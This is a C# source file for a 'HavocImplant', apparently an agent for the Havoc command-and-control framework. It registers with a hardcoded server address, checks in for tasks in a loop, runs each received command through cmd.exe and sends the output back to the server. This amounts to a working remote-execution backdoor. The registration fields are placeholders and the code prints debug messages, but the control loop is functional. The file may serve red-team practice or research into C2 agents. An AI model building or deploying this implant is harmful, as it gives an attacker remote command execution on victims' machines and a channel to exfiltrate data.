using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.Collections; 
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Text.RegularExpressions;
namespace HavocImplant
{
    public class Implant
    {
        byte[] id;
        string url = "http://192.168.179.130:80/";
        bool registered = false;
        int sleepTime = 3000;
        static void Main(string[] args)
        {
            bool isnull(byte b)
            {
                return (b == 0x00);
            }
            Implant implant = new Implant();
            while (!implant.registered) implant.Register();
            string outputData = "";
            while (true)
            {
                string commands = implant.CheckIn(outputData);
                outputData = "";
                if (commands.Length > 4)
                {
                    commands = commands.Substring(4);
                    List<byte> bruh = Encoding.UTF8.GetBytes(commands).ToList<byte>();
                    bruh.RemoveAll(isnull);
                    commands = Encoding.UTF8.GetString(bruh.ToArray());
                    
                    string[] commandsArray = commands.Split(null);
                    foreach (string command in commandsArray)
                    {
                        Console.WriteLine("Read command: {0}", command);
                        outputData += implant.runCommand(command);
                    }
                }
                Thread.Sleep(implant.sleepTime);
            }
            //Console.WriteLine(implant.runCommand("whoami /all"));
        }
        public void Register()
        {
            byte[] magic = new byte[] { 0x41, 0x41, 0x41, 0x41 };
            id = Encoding.ASCII.GetBytes(random_id().ToString());

            string registrationRequestBody = obtainRegisterDict(Int32.Parse(Encoding.ASCII.GetString(id)));
            byte[] agentHeader = createHeader(magic, registrationRequestBody);
            while (!sendReq(registrationRequestBody, agentHeader).Equals("registered"))
            { 
                Console.WriteLine("Trying to register"); 
                Thread.Sleep(sleepTime); 
            }
            registered = true;
        }
        public string CheckIn(string data)
        {
            Console.WriteLine("Checking in for taskings");
            
            byte[] magic = new byte[] { 0x41, 0x41, 0x41, 0x41 };

            string checkInRequestBody = "{\"task\": \"gettask\", \"data\": \"{0}\"}".Replace("{0}", Regex.Replace(data, @"\r\n?|\n|\n\r", "\\n"));
            //string checkInRequestBody = "{\"task\":\"gettask\",\"data\":\"{0}\"}".Replace("{0}", BitConverter.ToString(data));
            byte[] agentHeader = createHeader(magic, checkInRequestBody);
            string response = sendReq(checkInRequestBody, agentHeader);
            Console.WriteLine("Havoc Response: {0}".Replace("{0}", response));
            return response;

        }
        public byte[] createHeader(byte[] magic, string requestBody)
        {
            int size = requestBody.Length + 12;
            byte[] size_bytes = new byte[4] { 0x00, 0x00, 0x00, 0x00 };
            if (BitConverter.IsLittleEndian)
            {
                Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
                //Array.Copy(Encoding.UTF8.GetBytes(size.ToString()), size_bytes, Encoding.UTF8.GetBytes(size.ToString()).Length);
                Array.Reverse(size_bytes);
            }
            //else Array.Copy(Encoding.UTF8.GetBytes(size.ToString()), size_bytes, Encoding.UTF8.GetBytes(size.ToString()).Length);
            Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
            byte[] agentHeader = new byte[size_bytes.Length + magic.Length + id.Length];
            Array.Copy(size_bytes, 0, agentHeader, 0, size_bytes.Length);
            Array.Copy(magic, 0, agentHeader, size_bytes.Length, magic.Length);
            Array.Copy(id, 0, agentHeader, size_bytes.Length + magic.Length, id.Length);
            return agentHeader;
        }
        int random_id()
        {
            Random rand = new Random();
            int id = rand.Next(1000, 10000);
            return id;
        }
        string obtainRegisterDict(int id) 
        {
            Dictionary<string, string> registrationAttrs = new Dictionary<string, string>();
            registrationAttrs.Add("AgentID", id.ToString());
            registrationAttrs.Add("Hostname", "hostname here");
            registrationAttrs.Add("Username", "username here");
            registrationAttrs.Add("Domain", "domain here");
            registrationAttrs.Add("InternalIP", "need an internal ip");
            registrationAttrs.Add("Process Path", "process path here");
            registrationAttrs.Add("Process ID", "pid here");
            registrationAttrs.Add("Process Parent ID", "ppid here");
            registrationAttrs.Add("Process Arch", "x64");
            registrationAttrs.Add("Process Elevated", "elevated status here");
            registrationAttrs.Add("OS Build", "os build here");
            registrationAttrs.Add("OS Arch", "os arch here");
            registrationAttrs.Add("Sleep", 1.ToString());
            registrationAttrs.Add("Process Name", "process name here");
            registrationAttrs.Add("OS Version", "os verison here");
            string strRegistrationAttrsAsJSON = stringDictionaryToJson(registrationAttrs);
            string strPostReq = "{\"task\": \"register\", \"data\": \"{0}\"}".Replace("{0}", strRegistrationAttrsAsJSON);
            return strPostReq;
        }
        string stringDictionaryToJson(Dictionary<string, string> dict)
        {
            var entries = dict.Select(d =>
                string.Format("\\\"{0}\\\": \\\"{1}\\\"", d.Key, string.Join(",", d.Value)));
            return "{" + string.Join(",", entries) + "}";
        }
        public string sendReq(string requestBody, byte[] agentHeader)
        {
            string responseString = "";
            var request = (HttpWebRequest)WebRequest.Create(url);

            ArrayList arrayList = new ArrayList();
            arrayList.AddRange(agentHeader);

            string postData = requestBody;
            byte[] postBytes = Encoding.UTF8.GetBytes(postData);
            arrayList.AddRange(postBytes);
            byte[] data = (byte[])arrayList.ToArray(typeof(byte));

            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;
            try
            {
                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
                var response = (HttpWebResponse)request.GetResponse();

                byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                responseString = Encoding.UTF8.GetString(bytes);
            }
            catch (WebException ex)
            {
                if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                {
                    var response = (HttpWebResponse)ex.Response;

                    byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                    responseString = Encoding.UTF8.GetString(bytes);
                }
            }
            return responseString;
        }
        public string runCommand(string command)
        {
            if (command.Equals("goodbye")) Environment.Exit(0);

            string output = "";
            Console.WriteLine("Running cmd.exe /c " + command);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " +  command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.OutputDataReceived += (sender, args) => output += args.Data + Environment.NewLine;
            process.ErrorDataReceived += (sender, args) => output += args.Data + Environment.NewLine;
            process.Start();
            process.BeginErrorReadLine();
            process.BeginOutputReadLine();

            process.WaitForExit();
            Console.WriteLine("output: {0}", output);
            return output;
        }
    }
}
